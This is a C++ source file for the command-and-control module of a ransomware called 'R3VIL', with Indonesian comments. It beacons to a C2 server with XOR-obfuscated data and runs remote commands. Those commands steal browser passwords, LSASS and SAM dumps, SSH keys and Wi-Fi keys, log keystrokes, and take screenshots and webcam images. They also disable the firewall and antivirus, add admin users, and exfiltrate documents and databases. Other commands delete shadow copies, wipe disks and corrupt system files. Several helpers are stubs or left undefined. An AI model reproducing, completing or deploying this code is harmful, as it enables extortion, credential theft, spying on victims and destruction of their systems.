#include "c2_communication.h"
#include <iostream>
#include <chrono>
#include <ctime>
#include <cstring>
#include <random>

#ifdef _WIN32
#include <wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
#else
#include <ifaddrs.h>
#include <netinet/in.h>
#endif

C2Communication::C2Communication() 
    : running(false)
    , beacon_interval_seconds(300)
    , max_retries(3) {
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(180, 600);
    beacon_interval_seconds = dis(gen);
}

C2Communication::~C2Communication() {
    stop();
}

std::string C2Communication::generate_victim_id() {
    std::string id;
#ifdef _WIN32
    // Get MAC address
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }
    
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (pAdapter->AddressLength > 0) {
                char mac_str[18];
                snprintf(mac_str, sizeof(mac_str), "%02X%02X%02X%02X%02X%02X",
                    pAdapter->Address[0], pAdapter->Address[1], pAdapter->Address[2],
                    pAdapter->Address[3], pAdapter->Address[4], pAdapter->Address[5]);
                id = mac_str;
                break;
            }
            pAdapter = pAdapter->Next;
        }
    }
    free(pAdapterInfo);
    
    if (id.empty()) {
        char comp_name[256];
        DWORD size = sizeof(comp_name);
        if (GetComputerNameA(comp_name, &size)) {
            id = comp_name;
        }
    }
#else
    std::ifstream machine_id("/etc/machine-id");
    if (machine_id.is_open()) {
        std::getline(machine_id, id);
        machine_id.close();
    }
    
    if (id.empty()) {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        id = hostname;
    }
#endif
    return id;
}

std::string C2Communication::get_machine_info() {
    std::stringstream ss;
    
#ifdef _WIN32
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    ss << "hostname:" << hostname << "|";
    
    OSVERSIONINFOEXA osvi = { sizeof(osvi) };
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    ss << "os:Windows_" << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "|";
#else
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    ss << "hostname:" << hostname << "|";
    
    struct utsname u;
    uname(&u);
    ss << "os:" << u.sysname << "_" << u.release << "|";
#endif
    
    ss << "time:" << std::time(nullptr);
    
    return ss.str();
}

std::string C2Communication::base64_encode(const unsigned char* data, size_t len) {
    const std::string base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    for (size_t idx = 0; idx < len; idx++) {
        char_array_3[i++] = data[idx];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (i = 0; i < 4; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (j = 0; j < i + 1; j++)
            ret += base64_chars[char_array_4[j]];
        
        while (i++ < 3)
            ret += '=';
    }
    
    return ret;
}

std::string C2Communication::base64_decode(const std::string& encoded) {
    // Implementasi sederhana untuk decoding
    std::string decoded;
    // TODO: Implement full base64 decode
    return decoded;
}

std::string C2Communication::url_encode(const std::string& value) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else {
            escaped << std::uppercase;
            escaped << '%' << std::setw(2) << int((unsigned char)c);
            escaped << std::nouppercase;
        }
    }
    
    return escaped.str();
}

std::string C2Communication::xor_encrypt(const std::string& payload) {
    const std::string key = "R3VIL_C2_KEY_2026";
    std::string encrypted = payload;
    
    for (size_t i = 0; i < encrypted.size(); i++) {
        encrypted[i] ^= key[i % key.size()];
    }
    
    return base64_encode(reinterpret_cast<const unsigned char*>(encrypted.c_str()), encrypted.size());
}

std::string C2Communication::xor_decrypt(const std::string& payload) {
    // TODO: Implement decryption
    return payload;
}

std::string C2Communication::create_json(const std::map<std::string, std::string>& data) {
    std::stringstream ss;
    ss << "{";
    bool first = true;
    for (const auto& pair : data) {
        if (!first) ss << ",";
        ss << "\"" << pair.first << "\":\"" << pair.second << "\"";
        first = false;
    }
    ss << "}";
    return ss.str();
}

bool C2Communication::parse_json(const std::string& json, std::map<std::string, std::string>& output) {
    size_t pos = 0;
    while (pos < json.length()) {
        size_t key_start = json.find("\"", pos);
        if (key_start == std::string::npos) break;
        size_t key_end = json.find("\"", key_start + 1);
        if (key_end == std::string::npos) break;
        
        std::string key = json.substr(key_start + 1, key_end - key_start - 1);
        
        size_t colon = json.find(":", key_end);
        if (colon == std::string::npos) break;
        
        size_t val_start = json.find("\"", colon + 1);
        if (val_start == std::string::npos) break;
        size_t val_end = json.find("\"", val_start + 1);
        if (val_end == std::string::npos) break;
        
        std::string value = json.substr(val_start + 1, val_end - val_start - 1);
        output[key] = value;
        
        pos = val_end + 1;
    }
    return !output.empty();
}

#ifdef _WIN32
bool C2Communication::http_post(const std::string& url, const std::string& data, std::string& response) {
    std::string host, path;
    size_t proto_pos = url.find("://");
    if (proto_pos == std::string::npos) return false;
    
    size_t host_start = proto_pos + 3;
    size_t path_start = url.find("/", host_start);
    
    if (path_start == std::string::npos) {
        host = url.substr(host_start);
        path = "/";
    } else {
        host = url.substr(host_start, path_start - host_start);
        path = url.substr(path_start);
    }
    
    HINTERNET hSession = WinHttpOpen(L"R3VIL/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    
    int host_len = MultiByteToWideChar(CP_UTF8, 0, host.c_str(), -1, NULL, 0);
    wchar_t* whost = new wchar_t[host_len];
    MultiByteToWideChar(CP_UTF8, 0, host.c_str(), -1, whost, host_len);
    
    HINTERNET hConnect = WinHttpConnect(hSession, whost, INTERNET_DEFAULT_HTTPS_PORT, 0);
    delete[] whost;
    
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", 
        std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    LPCWSTR headers = L"Content-Type: application/json\r\n";
    WinHttpSendRequest(hRequest, headers, wcslen(headers), 
        (LPVOID)data.c_str(), data.length(), data.length(), 0);
    
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }
    
    DWORD bytesRead = 0;
    char buffer[4096];
    response.clear();
    
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        response += buffer;
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return true;
}

bool C2Communication::http_get(const std::string& url, std::string& response) {
    return http_post(url, "", response);
}
#else
static size_t curl_write_callback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

bool C2Communication::http_post(const std::string& url, const std::string& data, std::string& response) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, data.length());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}

bool C2Communication::http_get(const std::string& url, std::string& response) {
    CURL* curl = curl_easy_init();
    if (!curl) return false;
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    
    return res == CURLE_OK;
}
#endif

void C2Communication::initialize(const std::string& c2_server) {
    c2_url = c2_server;
    victim_id = generate_victim_id();
    beacon_endpoint = c2_url + "/api/beacon";
    upload_endpoint = c2_url + "/api/upload";
    command_endpoint = c2_url + "/api/commands";
    
    std::cout << "[C2] Initialized with ID: " << victim_id << std::endl;
}

void C2Communication::start() {
    if (running) return;
    
    running = true;
    send_status("initialized");
    
    beacon_thread = std::thread([this]() {
        auto last_beacon = std::chrono::steady_clock::now();
        while (running) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_beacon).count();
            
            if (elapsed >= beacon_interval_seconds) {
                send_status("alive");
                last_beacon = now;
                
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dis(180, 600);
                beacon_interval_seconds = dis(gen);
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    });
    
    command_thread = std::thread([this]() {
        while (running) {
            poll_commands();
            std::this_thread::sleep_for(std::chrono::seconds(60));
        }
    });
}


// Tambahkan ke c2_communication.cpp

// Browser password extraction (Windows)
void extract_browser_passwords() {
    std::string output;
    
    #ifdef _WIN32
    // Chrome passwords
    std::string chrome_path = getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default\\Login Data");
    if (fs::exists(chrome_path)) {
        output += "=== CHROME PASSWORDS ===\n";
        output += exec_cmd("sqlite3 \"" + chrome_path + "\" \"SELECT origin_url, username_value, password_value FROM logins;\"");
    }
    
    // Firefox passwords
    std::string firefox_path = getenv("APPDATA") + std::string("\\Mozilla\\Firefox\\Profiles");
    if (fs::exists(firefox_path)) {
        output += "=== FIREFOX PASSWORDS ===\n";
        output += exec_cmd("python -c \"import decrypt; decrypt.firefox()\"");
    }
    #endif
    
    std::ofstream file("browser_passwords.txt");
    file << output;
    file.close();
}

// Screenshot capture
void take_screenshot() {
    #ifdef _WIN32
    // Use GDI to capture screen
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    // Save as JPEG using GDI+
    // ... implementation ...
    
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    #endif
}

// Keylogger implementation
std::ofstream keylog_file;
bool keylogging = false;

void start_keylogger() {
    keylogging = true;
    keylog_file.open("keylog.txt", std::ios::app);
    
    #ifdef _WIN32
    std::thread([]() {
        while (keylogging) {
            for (int key = 8; key <= 255; key++) {
                if (GetAsyncKeyState(key) & 0x0001) {
                    char key_char = map_virtual_key(key);
                    keylog_file << key_char;
                    keylog_file.flush();
                }
            }
            Sleep(10);
        }
    }).detach();
    #endif
}

void stop_keylogger() {
    keylogging = false;
    if (keylog_file.is_open()) {
        keylog_file.close();
    }
}

// Network scanning
std::vector<std::string> scan_network(const std::string& subnet) {
    std::vector<std::string> active_hosts;
    
    #ifdef _WIN32
    // Ping sweep
    for (int i = 1; i <= 254; i++) {
        std::string ip = "192.168.1." + std::to_string(i);
        std::string cmd = "ping -n 1 -w 100 " + ip + " > nul 2>&1 && echo " + ip;
        std::string result = exec_cmd(cmd);
        if (!result.empty()) {
            active_hosts.push_back(ip);
        }
    }
    #endif
    
    return active_hosts;
}

// Database dumping
void dump_databases() {
    std::vector<std::string> db_files;
    
    // Find MySQL databases
    #ifdef _WIN32
    std::string mysql_data = "C:\\ProgramData\\MySQL\\MySQL Server *\\Data\\";
    #else
    std::string mysql_data = "/var/lib/mysql/";
    #endif
    
    if (fs::exists(mysql_data)) {
        for (const auto& entry : fs::recursive_directory_iterator(mysql_data)) {
            if (entry.path().extension() == ".ibd" || entry.path().extension() == ".frm") {
                db_files.push_back(entry.path().string());
            }
        }
    }
    
    // Create archive of databases
    create_zip_archive(db_files, "databases.zip");
}

// Corrupt system files (destructive)
void corrupt_system_files() {
    std::vector<std::string> critical_files;
    
    #ifdef _WIN32
    critical_files = {
        "C:\\Windows\\System32\\config\\SAM",
        "C:\\Windows\\System32\\config\\SYSTEM",
        "C:\\Windows\\bootstat.dat"
    };
    #else
    critical_files = {
        "/boot/vmlinuz-*",
        "/etc/passwd",
        "/etc/shadow"
    };
    #endif
    
    for (const auto& file : critical_files) {
        std::ofstream f(file, std::ios::binary | std::ios::trunc);
        f << "CORRUPTED_BY_R3VIL";
        f.close();
    }
}

// Change ransom note dynamically
void change_ransom_note(const std::string& new_note) {
    std::string path;
    #ifdef _WIN32
    char desk[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desk);
    path = std::string(desk) + "\\README_LOCKED.txt";
    #else
    path = std::string(getenv("HOME")) + "/Desktop/README_LOCKED.txt";
    #endif
    
    std::ofstream f(path);
    f << new_note;
    f.close();
    
    // Update all existing README files
    for (const auto& entry : fs::recursive_directory_iterator("/")) {
        if (entry.path().filename() == "README_LOCKED.txt") {
            fs::copy(path, entry.path(), fs::copy_options::overwrite_existing);
        }
    }
}




void C2Communication::stop() {
    running = false;
    if (beacon_thread.joinable()) beacon_thread.join();
    if (command_thread.joinable()) command_thread.join();
}

void C2Communication::send_status(const std::string& status, const std::map<std::string, std::string>& extra) {
    std::map<std::string, std::string> data;
    data["victim_id"] = victim_id;
    data["status"] = status;
    data["machine_info"] = get_machine_info();
    data["timestamp"] = std::to_string(std::time(nullptr));
    
    for (const auto& e : extra) {
        data[e.first] = e.second;
    }
    
    std::string json = create_json(data);
    std::string encrypted = xor_encrypt(json);
    
    std::string response;
    for (int attempt = 0; attempt < max_retries; attempt++) {
        if (http_post(beacon_endpoint, encrypted, response)) {
            std::cout << "[C2] Status sent: " << status << std::endl;
            break;
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

void C2Communication::send_encryption_stats(int encrypted_files, int failed_files, long long total_size) {
    std::map<std::string, std::string> extra;
    extra["encrypted_files"] = std::to_string(encrypted_files);
    extra["failed_files"] = std::to_string(failed_files);
    extra["total_size_mb"] = std::to_string(total_size / (1024 * 1024));
    
    send_status("encryption_complete", extra);
}

void C2Communication::send_credentials(const std::string& cred_type, const std::string& data) {
    std::map<std::string, std::string> extra;
    extra["cred_type"] = cred_type;
    extra["cred_data"] = base64_encode(reinterpret_cast<const unsigned char*>(data.c_str()), data.size());
    
    send_status("credentials_collected", extra);
}

void C2Communication::send_screenshot(const std::string& image_path) {
    std::ifstream file(image_path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
    
    std::map<std::string, std::string> extra;
    extra["screenshot"] = encoded;
    extra["screenshot_format"] = "jpg";
    
    send_status("screenshot_taken", extra);
}

void C2Communication::send_keylog(const std::string& log_data) {
    std::map<std::string, std::string> extra;
    extra["keylog_data"] = base64_encode(reinterpret_cast<const unsigned char*>(log_data.c_str()), log_data.size());
    
    send_status("keylog_sent", extra);
}

void C2Communication::send_collected_files(const std::string& zip_path) {
    std::ifstream file(zip_path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
    
    std::map<std::string, std::string> extra;
    extra["archive_data"] = encoded;
    extra["archive_name"] = zip_path;
    
    send_status("files_collected", extra);
}

void C2Communication::send_loot(const std::string& loot_type, const std::string& loot_data) {
    std::map<std::string, std::string> extra;
    extra["loot_type"] = loot_type;
    extra["loot_data"] = base64_encode(reinterpret_cast<const unsigned char*>(loot_data.c_str()), loot_data.size());
    
    send_status("loot_sent", extra);
}

void C2Communication::send_file(const std::string& file_path, const std::string& file_type) {
    std::ifstream file(file_path, std::ios::binary);
    if (!file.is_open()) return;
    
    std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::string encoded = base64_encode(reinterpret_cast<const unsigned char*>(buffer.data()), buffer.size());
    
    std::map<std::string, std::string> extra;
    extra["file_type"] = file_type;
    extra["file_name"] = file_path;
    extra["file_data"] = encoded;
    
    send_status("file_sent", extra);
}

void C2Communication::set_command_callback(std::function<void(const std::string&)> callback) {
    on_execute_command = callback;
}

void C2Communication::poll_commands() {
    std::string url = command_endpoint + "?victim_id=" + url_encode(victim_id);
    std::string response;
    
    if (!http_get(url, response)) {
        return;
    }
    
    std::map<std::string, std::string> commands;
    if (parse_json(response, commands)) {
        for (const auto& cmd : commands) {
            if (cmd.first == "command") {
                std::cout << "[C2] Received command: " << cmd.second << std::endl;
                if (on_execute_command) {
                    on_execute_command(cmd.second);
                }
            }
        }
    }
}

// Implementasi lengkap command handler di c2_communication.cpp
void C2Communication::execute_command(const std::string& command, const std::map<std::string, std::string>& params) {
    
    // ========== SYSTEM CONTROL ==========
    if (command == "stop" || command == "kill") {
        // Menghentikan ransomware
        send_status("stopping");
        exit(0);
    }
    else if (command == "restart") {
        // Restart ransomware
        send_status("restarting");
        #ifdef _WIN32
        ShellExecuteA(NULL, "open", current_exe.c_str(), NULL, NULL, SW_SHOW);
        #endif
        exit(0);
    }
    else if (command == "status") {
        // Laporkan status lengkap
        std::map<std::string, std::string> status;
        status["encrypted_files"] = std::to_string(encrypted_count);
        status["failed_files"] = std::to_string(failed_count);
        status["uptime"] = std::to_string(time(NULL) - start_time);
        status["victim_id"] = victim_id;
        send_status("status_report", status);
    }
    
    // ========== COMMAND EXECUTION ==========
    else if (command == "exec") {
        // Eksekusi command shell apapun
        std::string cmd = params.at("cmd");
        std::string result = exec_cmd(cmd);
        send_status("command_output", {{"result", result}});
    }
    else if (command == "exec_powershell") {
        #ifdef _WIN32
        std::string cmd = "powershell -Command \"" + params.at("cmd") + "\"";
        std::string result = exec_cmd(cmd);
        send_status("powershell_output", {{"result", result}});
        #endif
    }
    else if (command == "exec_bash") {
        #ifdef __linux__
        std::string cmd = params.at("cmd");
        std::string result = exec_cmd(cmd);
        send_status("bash_output", {{"result", result}});
        #endif
    }
    
    // ========== FILE OPERATIONS ==========
    else if (command == "download_file") {
        // Download file dari victim ke C2
        std::string filepath = params.at("path");
        send_file(filepath, "downloaded");
    }
    else if (command == "upload_file") {
        // Upload file dari C2 ke victim
        std::string content = params.at("content");
        std::string path = params.at("path");
        std::ofstream file(path);
        file << content;
        file.close();
        send_status("file_uploaded", {{"path", path}});
    }
    else if (command == "delete_file") {
        // Hapus file
        std::string path = params.at("path");
        fs::remove(path);
        send_status("file_deleted", {{"path", path}});
    }
    else if (command == "list_directory") {
        // List directory contents
        std::string path = params.at("path");
        std::string listing;
        for (const auto& entry : fs::directory_iterator(path)) {
            listing += entry.path().string() + "\n";
        }
        send_status("directory_listing", {{"listing", listing}});
    }
    else if (command == "find_files") {
        // Cari file berdasarkan pattern
        std::string pattern = params.at("pattern");
        std::string results;
        for (const auto& entry : fs::recursive_directory_iterator("/")) {
            if (entry.path().string().find(pattern) != std::string::npos) {
                results += entry.path().string() + "\n";
            }
        }
        send_status("files_found", {{"results", results}});
    }
    
    // ========== CREDENTIAL STEALING ==========
    else if (command == "dump_lsass") {
        #ifdef _WIN32
        if (dump_lsass()) {
            send_file("lsass.dmp", "lsass_dump");
        }
        #endif
    }
    else if (command == "dump_sam") {
        #ifdef _WIN32
        // Dump SAM registry
        system("reg save HKLM\\SAM sam.hive");
        system("reg save HKLM\\SYSTEM system.hive");
        send_file("sam.hive", "sam_dump");
        send_file("system.hive", "system_dump");
        #endif
    }
    else if (command == "dump_browser_passwords") {
        // Extract browser saved passwords
        extract_browser_passwords();
        send_file("browser_passwords.txt", "credentials");
    }
    else if (command == "dump_ssh_keys") {
        #ifdef __linux__
        std::string ssh_dir = std::string(getenv("HOME")) + "/.ssh";
        if (fs::exists(ssh_dir)) {
            create_zip_archive({ssh_dir}, "ssh_keys.zip");
            send_file("ssh_keys.zip", "ssh_keys");
        }
        #endif
    }
    else if (command == "dump_wifi_passwords") {
        #ifdef _WIN32
        std::string result = exec_cmd("netsh wlan show profile name=* key=clear");
        send_status("wifi_passwords", {{"passwords", result}});
        #endif
    }
    
    // ========== SCREENSHOT & RECORDING ==========
    else if (command == "screenshot") {
        take_screenshot();
        send_file("screenshot.jpg", "screenshot");
    }
    else if (command == "record_mic") {
        start_mic_recording(10); // Record 10 seconds
        send_file("recording.wav", "audio");
    }
    else if (command == "webcam_capture") {
        capture_webcam();
        send_file("webcam.jpg", "webcam");
    }
    
    // ========== KEYLOGGING ==========
    else if (command == "start_keylog") {
        start_keylogger();
        send_status("keylogger_started");
    }
    else if (command == "stop_keylog") {
        stop_keylogger();
        send_file("keylog.txt", "keylog");
    }
    else if (command == "get_keylog") {
        send_file("keylog.txt", "keylog");
    }
    
    // ========== NETWORK & PERSISTENCE ==========
    else if (command == "lateral_move") {
        // Propagate to other machines
        perform_lateral_movement();
    }
    else if (command == "install_persistence") {
        install_persistence();
    }
    else if (command == "remove_persistence") {
        remove_persistence();
    }
    else if (command == "network_scan") {
        // Scan network
        std::vector<std::string> hosts = scan_network("192.168.1.0/24");
        std::string results;
        for (const auto& host : hosts) {
            results += host + "\n";
        }
        send_status("network_scan", {{"hosts", results}});
    }
    
    // ========== RANSOMWARE CONTROL ==========
    else if (command == "pause_encryption") {
        pause_encryption_flag = true;
        send_status("encryption_paused");
    }
    else if (command == "resume_encryption") {
        pause_encryption_flag = false;
        send_status("encryption_resumed");
    }
    else if (command == "change_ransom_note") {
        std::string new_note = params.at("note");
        change_ransom_note(new_note);
    }
    else if (command == "decrypt_files") {
        // Decrypt files (for testing or after payment)
        std::string key = params.at("key");
        decrypt_all_files(key);
        send_status("decryption_completed");
    }
    else if (command == "list_encrypted") {
        // List all encrypted files
        send_file(LOG_FILE, "encrypted_files_log");
    }
    
    // ========== SYSTEM MANIPULATION ==========
    else if (command == "disable_av") {
        disable_av_edr_windows();
        send_status("av_disabled");
    }
    else if (command == "disable_firewall") {
        #ifdef _WIN32
        system("netsh advfirewall set allprofiles state off");
        send_status("firewall_disabled");
        #endif
    }
    else if (command == "enable_rdp") {
        #ifdef _WIN32
        system("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
        system("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
        send_status("rdp_enabled");
        #endif
    }
    else if (command == "create_user") {
        std::string username = params.at("username");
        std::string password = params.at("password");
        #ifdef _WIN32
        std::string cmd = "net user " + username + " " + password + " /add";
        system(cmd.c_str());
        cmd = "net localgroup administrators " + username + " /add";
        system(cmd.c_str());
        #endif
        send_status("user_created");
    }
    
    // ========== DATA EXFILTRATION ==========
    else if (command == "collect_documents") {
        collect_sensitive_documents();
        send_file("collected_docs.zip", "documents");
    }
    else if (command == "collect_browser_data") {
        collect_browser_data();
        send_file("browser_data.zip", "browser_data");
    }
    else if (command == "collect_email") {
        collect_email_data();
        send_file("emails.zip", "emails");
    }
    else if (command == "collect_database") {
        dump_databases();
        send_file("databases.zip", "databases");
    }
    else if (command == "collect_all") {
        // Collect everything
        collect_sensitive_documents();
        collect_browser_data();
        collect_email_data();
        dump_databases();
        create_zip_archive({"collected_docs.zip", "browser_data.zip", "emails.zip", "databases.zip"}, "all_data.zip");
        send_file("all_data.zip", "complete_loot");
    }
    
    // ========== DESTRUCTIVE COMMANDS ==========
    else if (command == "wipe_disk") {
        #ifdef _WIN32
        system("cipher /w:C:\\"); // Overwrite free space
        #endif
        send_status("disk_wipe_started");
    }
    else if (command == "delete_shadows") {
        #ifdef _WIN32
        system("vssadmin delete shadows /all /quiet");
        send_status("shadows_deleted");
        #endif
    }
    else if (command == "corrupt_files") {
        corrupt_system_files();
        send_status("files_corrupted");
    }
    
    // ========== CUSTOM SCRIPTING ==========
    else if (command == "run_script") {
        std::string script = params.at("script");
        std::string type = params.at("type"); // python, lua, js
        
        if (type == "python") {
            std::ofstream file("temp.py");
            file << script;
            file.close();
            exec_cmd("python temp.py");
        }
        else if (type == "javascript") {
            // Execute JavaScript via Node.js
            std::ofstream file("temp.js");
            file << script;
            file.close();
            exec_cmd("node temp.js");
        }
        send_status("script_executed");
    }
}


bool C2Communication::is_connected() const {
    std::string response;
    std::string test_url = c2_url + "/api/ping";
    return http_get(test_url, response);
}
